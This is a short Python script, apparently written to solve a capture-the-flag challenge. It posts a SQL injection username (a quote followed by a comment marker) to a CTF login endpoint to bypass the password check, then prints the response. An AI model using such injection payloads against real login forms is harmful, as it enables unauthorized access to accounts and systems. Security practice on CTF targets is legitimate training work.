import requests

response = requests.post('http://lotuxctf.com:20002/login', data={'username': "curious' -- ", 'password': 'meow'})
print(response.status_code)  # 确保请求成功返回状态码

print(response.headers)

print(response.text)